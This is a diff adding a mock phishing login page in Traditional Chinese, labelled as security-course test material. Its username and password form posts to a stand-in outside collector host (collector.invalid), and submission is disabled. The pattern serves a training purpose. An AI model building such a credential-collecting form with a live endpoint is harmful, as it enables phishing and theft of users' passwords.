@@ -1,0 +1,12 @@
+<!doctype html><html lang="zh-Hant"><head><meta charset="utf-8"><title>登入驗證示範</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body>
+<h1>帳戶登入驗證（僅供資安課程測試）</h1>
+<p>模擬跨網域收集密碼的可疑網頁；請勿輸入任何真實資訊。</p>
+<form action="https://collector.invalid/collect" method="post" onsubmit="return false;">
+<label>帳號 <input type="text" name="demo_user" autocomplete="off"></label>
+<label>密碼 <input type="password" name="demo_password" autocomplete="off"></label>
+<input type="hidden" name="token" value="demo-only">
+<button type="submit" disabled>測試用登入按鈕（已停用）</button>
+</form>
+
+<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="示範圖片" width="1" height="1">
+</body></html>
